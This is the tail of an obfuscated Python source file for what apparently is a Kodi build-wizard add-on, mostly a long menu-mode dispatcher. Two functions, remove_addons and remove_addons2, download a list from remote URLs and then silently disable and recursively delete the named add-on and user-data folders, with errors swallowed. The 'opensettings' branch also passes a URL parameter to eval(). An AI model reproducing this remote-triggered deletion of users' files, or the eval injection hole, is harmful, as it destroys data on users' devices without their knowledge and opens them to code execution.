	if not menu ==None :O000O0OOOOOO0OO00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5064
	OO00OOO0O00000O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO0O0O0OOO00000 ,listitem =O000O0OOOOOO0OO00 ,isFolder =False )#line:5065
	return OO00OOO0O00000O00 #line:5066
def get_params ():#line:5068
	OO0000OO0O0OOO0O0 =[]#line:5069
	O0O0000O0OOO0O0O0 =sys .argv [2 ]#line:5070
	if len (O0O0000O0OOO0O0O0 )>=2 :#line:5071
		O0000OOO0000O0000 =sys .argv [2 ]#line:5072
		OOOO0000O0OOO0OO0 =O0000OOO0000O0000 .replace ('?','')#line:5073
		if (O0000OOO0000O0000 [len (O0000OOO0000O0000 )-1 ]=='/'):#line:5074
			O0000OOO0000O0000 =O0000OOO0000O0000 [0 :len (O0000OOO0000O0000 )-2 ]#line:5075
		O0O0O00OOO0000OO0 =OOOO0000O0OOO0OO0 .split ('&')#line:5076
		OO0000OO0O0OOO0O0 ={}#line:5077
		for O0OOOO00O00000OO0 in range (len (O0O0O00OOO0000OO0 )):#line:5078
			O0OO0OOOO0OOO0OO0 ={}#line:5079
			O0OO0OOOO0OOO0OO0 =O0O0O00OOO0000OO0 [O0OOOO00O00000OO0 ].split ('=')#line:5080
			if (len (O0OO0OOOO0OOO0OO0 ))==2 :#line:5081
				OO0000OO0O0OOO0O0 [O0OO0OOOO0OOO0OO0 [0 ]]=O0OO0OOOO0OOO0OO0 [1 ]#line:5082
		return OO0000OO0O0OOO0O0 #line:5084
def remove_addons ():#line:5086
	try :#line:5087
			import json #line:5088
			O0O00OO00OOO0OO0O =urllib2 .urlopen (remove_url ).readlines ()#line:5089
			for O00O00O00O00000OO in O0O00OO00OOO0OO0O :#line:5090
				OOO000OO0O00OOO0O =O00O00O00O00000OO .split (':')[1 ].strip ()#line:5092
				O00000O0OOOOOO0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOO000OO0O00OOO0O ,'false')#line:5093
				O0OO0OO0O0OOO0O0O =xbmc .executeJSONRPC (O00000O0OOOOOO0O0 )#line:5094
				OOO000OO00OO0OOOO =json .loads (O0OO0OO0O0OOO0O0O )#line:5095
				OO00OO00OO0O00OO0 =os .path .join (addons_folder ,OOO000OO0O00OOO0O )#line:5097
				if os .path .exists (OO00OO00OO0O00OO0 ):#line:5099
					for O00O00000OO00O0OO ,O00000O0O000OOOO0 ,OO000O0O0O00O0O0O in os .walk (OO00OO00OO0O00OO0 ):#line:5100
						for O00O00OO0OO00O0OO in OO000O0O0O00O0O0O :#line:5101
							os .unlink (os .path .join (O00O00000OO00O0OO ,O00O00OO0OO00O0OO ))#line:5102
						for O0OO0O00OO0O0OOO0 in O00000O0O000OOOO0 :#line:5103
							shutil .rmtree (os .path .join (O00O00000OO00O0OO ,O0OO0O00OO0O0OOO0 ))#line:5104
					os .rmdir (OO00OO00OO0O00OO0 )#line:5105
			xbmc .executebuiltin ('Container.Refresh')#line:5107
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5108
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5109
	except :pass #line:5110
def remove_addons2 ():#line:5111
	try :#line:5112
			import json #line:5113
			O0O0OO00O0OO0O0O0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5114
			for O0OOOOO0OO0O0O00O in O0O0OO00O0OO0O0O0 :#line:5115
				OO0O00000O000000O =O0OOOOO0OO0O0O00O .split (':')[1 ].strip ()#line:5117
				O00OOO0O000O00000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0O00000O000000O ,'false')#line:5118
				O000O0O0O00OO000O =xbmc .executeJSONRPC (O00OOO0O000O00000 )#line:5119
				OOO00O000000000O0 =json .loads (O000O0O0O00OO000O )#line:5120
				OOOOO000OOO000OOO =os .path .join (user_folder ,OO0O00000O000000O )#line:5122
				if os .path .exists (OOOOO000OOO000OOO ):#line:5124
					for O00OO000000OO0O00 ,O00O0O0OOO0OO0OOO ,O0O00OO00000O00OO in os .walk (OOOOO000OOO000OOO ):#line:5125
						for OO0OOO0OOOO000OOO in O0O00OO00000O00OO :#line:5126
							os .unlink (os .path .join (O00OO000000OO0O00 ,OO0OOO0OOOO000OOO ))#line:5127
						for OOO00OOOOO00OOOOO in O00O0O0OOO0OO0OOO :#line:5128
							shutil .rmtree (os .path .join (O00OO000000OO0O00 ,OOO00OOOOO00OOOOO ))#line:5129
					os .rmdir (OOOOO000OOO000OOO )#line:5130
	except :pass #line:5132
params =get_params ()#line:5133
url =None #line:5134
name =None #line:5135
mode =None #line:5136
try :mode =urllib .unquote_plus (params ["mode"])#line:5138
except :pass #line:5139
try :name =urllib .unquote_plus (params ["name"])#line:5140
except :pass #line:5141
try :url =urllib .unquote_plus (params ["url"])#line:5142
except :pass #line:5143
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5145
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5146
def setView (O0OOO0OO0OOOO00O0 ,OOOOOOOO000OOO00O ):#line:5147
	if wiz .getS ('auto-view')=='true':#line:5148
		O0O00000OO0OOO00O =wiz .getS (OOOOOOOO000OOO00O )#line:5149
		if O0O00000OO0OOO00O =='50'and KODIV >=17 and SKIN =='skin.estuary':O0O00000OO0OOO00O ='55'#line:5150
		if O0O00000OO0OOO00O =='500'and KODIV >=17 and SKIN =='skin.estuary':O0O00000OO0OOO00O ='50'#line:5151
		wiz .ebi ("Container.SetViewMode(%s)"%O0O00000OO0OOO00O )#line:5152
if mode ==None :index ()#line:5154
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5156
elif mode =='builds':buildMenu ()#line:5157
elif mode =='viewbuild':viewBuild (name )#line:5158
elif mode =='buildinfo':buildInfo (name )#line:5159
elif mode =='buildpreview':buildVideo (name )#line:5160
elif mode =='install':buildWizard (name ,url )#line:5161
elif mode =='theme':buildWizard (name ,mode ,url )#line:5162
elif mode =='viewthirdparty':viewThirdList (name )#line:5163
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5164
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5165
elif mode =='maint':maintMenu (name )#line:5167
elif mode =='passpin':passandpin ()#line:5168
elif mode =='backmyupbuild':backmyupbuild ()#line:5169
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5170
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5171
elif mode =='advancedsetting':advancedWindow (name )#line:5172
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5173
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5174
elif mode =='asciicheck':wiz .asciiCheck ()#line:5175
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5176
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5177
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5178
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5179
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5180
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5181
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5182
elif mode =='currentsettings':viewAdvanced ()#line:5183
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5184
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5185
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5186
elif mode =='fixskin':backtokodi ()#line:5187
elif mode =='testcommand':testcommand ()#line:5188
elif mode =='logsend':logsend ()#line:5189
elif mode =='rdon':rdon ()#line:5190
elif mode =='rdoff':rdoff ()#line:5191
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5192
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5193
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5194
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5195
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5196
elif mode =='freshstart':freshStart ()#line:5197
elif mode =='forceupdate':wiz .forceUpdate ()#line:5198
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5199
elif mode =='forceclose':wiz .killxbmc ()#line:5200
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5201
elif mode =='hidepassword':wiz .hidePassword ()#line:5202
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5203
elif mode =='enableaddons':enableAddons ()#line:5204
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5205
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5206
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5207
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5208
elif mode =='uploadlog':uploadLog .Main ()#line:5209
elif mode =='viewlog':LogViewer ()#line:5210
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5211
elif mode =='viewerrorlog':errorChecking (all =True )#line:5212
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5213
elif mode =='purgedb':purgeDb ()#line:5214
elif mode =='fixaddonupdate':fixUpdate ()#line:5215
elif mode =='removeaddons':removeAddonMenu ()#line:5216
elif mode =='removeaddon':removeAddon (name )#line:5217
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5218
elif mode =='removedata':removeAddonData (name )#line:5219
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5220
elif mode =='systeminfo':systemInfo ()#line:5221
elif mode =='restorezip':restoreit ('build')#line:5222
elif mode =='restoregui':restoreit ('gui')#line:5223
elif mode =='restoreaddon':restoreit ('addondata')#line:5224
elif mode =='restoreextzip':restoreextit ('build')#line:5225
elif mode =='restoreextgui':restoreextit ('gui')#line:5226
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5227
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5228
elif mode =='apk':apkMenu (name )#line:5230
elif mode =='apkscrape':apkScraper (name )#line:5231
elif mode =='apkinstall':apkInstaller (name ,url )#line:5232
elif mode =='speed':speedMenu ()#line:5233
elif mode =='net':net_tools ()#line:5234
elif mode =='GetList':GetList (url )#line:5235
elif mode =='youtube':youtubeMenu (name )#line:5236
elif mode =='viewVideo':playVideo (url )#line:5237
elif mode =='addons':addonMenu (name )#line:5239
elif mode =='addoninstall':addonInstaller (name ,url )#line:5240
elif mode =='savedata':saveMenu ()#line:5242
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5243
elif mode =='managedata':manageSaveData (name )#line:5244
elif mode =='whitelist':wiz .whiteList (name )#line:5245
elif mode =='trakt':traktMenu ()#line:5247
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5248
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5249
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5250
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5251
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5252
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5253
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5254
elif mode =='realdebrid':realMenu ()#line:5256
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5257
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5258
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5259
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5260
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5261
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5262
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5263
elif mode =='login':loginMenu ()#line:5265
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5266
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5267
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5268
elif mode =='clearlogin':loginit .clearSaved (name )#line:5269
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5270
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5271
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5272
elif mode =='contact':notify .contact (CONTACT )#line:5274
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5275
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5276
elif mode =='developer':developer ()#line:5278
elif mode =='converttext':wiz .convertText ()#line:5279
elif mode =='createqr':wiz .createQR ()#line:5280
elif mode =='testnotify':testnotify ()#line:5281
elif mode =='testnotify2':testnotify2 ()#line:5282
elif mode =='servicemanual':servicemanual ()#line:5283
elif mode =='fastinstall':fastinstall ()#line:5284
elif mode =='testupdate':testupdate ()#line:5285
elif mode =='testfirst':testfirst ()#line:5286
elif mode =='testfirstrun':testfirstRun ()#line:5287
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5288
elif mode =='bg':wiz .bg_install (name ,url )#line:5290
elif mode =='bgcustom':wiz .bg_custom ()#line:5291
elif mode =='bgremove':wiz .bg_remove ()#line:5292
elif mode =='bgdefault':wiz .bg_default ()#line:5293
elif mode =='rdset':rdsetup ()#line:5294
elif mode =='mor':morsetup ()#line:5295
elif mode =='mor2':morsetup2 ()#line:5296
elif mode =='resolveurl':resolveurlsetup ()#line:5297
elif mode =='urlresolver':urlresolversetup ()#line:5298
elif mode =='forcefastupdate':forcefastupdate ()#line:5299
elif mode =='traktset':traktsetup ()#line:5300
elif mode =='placentaset':placentasetup ()#line:5301
elif mode =='flixnetset':flixnetsetup ()#line:5302
elif mode =='reptiliaset':reptiliasetup ()#line:5303
elif mode =='yodasset':yodasetup ()#line:5304
elif mode =='numbersset':numberssetup ()#line:5305
elif mode =='uranusset':uranussetup ()#line:5306
elif mode =='genesisset':genesissetup ()#line:5307
elif mode =='fastupdate':fastupdate ()#line:5308
elif mode =='folderback':folderback ()#line:5309
elif mode =='menudata':Menu ()#line:5310
elif mode ==2 :#line:5312
        wiz .torent_menu ()#line:5313
elif mode ==3 :#line:5314
        wiz .popcorn_menu ()#line:5315
elif mode ==8 :#line:5316
        wiz .metaliq_fix ()#line:5317
elif mode ==9 :#line:5318
        wiz .quasar_menu ()#line:5319
elif mode ==5 :#line:5320
        swapSkins ('skin.Premium.mod')#line:5321
elif mode ==13 :#line:5322
        wiz .elementum_menu ()#line:5323
elif mode ==16 :#line:5324
        wiz .fix_wizard ()#line:5325
elif mode ==17 :#line:5326
        wiz .last_play ()#line:5327
elif mode ==18 :#line:5328
        wiz .normal_metalliq ()#line:5329
elif mode ==19 :#line:5330
        wiz .fast_metalliq ()#line:5331
elif mode ==20 :#line:5332
        wiz .fix_buffer2 ()#line:5333
elif mode ==21 :#line:5334
        wiz .fix_buffer3 ()#line:5335
elif mode ==11 :#line:5336
        wiz .fix_buffer ()#line:5337
elif mode ==15 :#line:5338
        wiz .fix_font ()#line:5339
elif mode ==14 :#line:5340
        wiz .clean_pass ()#line:5341
elif mode ==22 :#line:5342
        wiz .movie_update ()#line:5343
elif mode =='adv_settings':buffer1 ()#line:5344
elif mode =='getpass':getpass ()#line:5345
elif mode =='setpass':setpass ()#line:5346
elif mode =='setuname':setuname ()#line:5347
elif mode =='passandUsername':passandUsername ()#line:5348
elif mode =='9':disply_hwr ()#line:5349
elif mode =='99':disply_hwr2 ()#line:5350
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))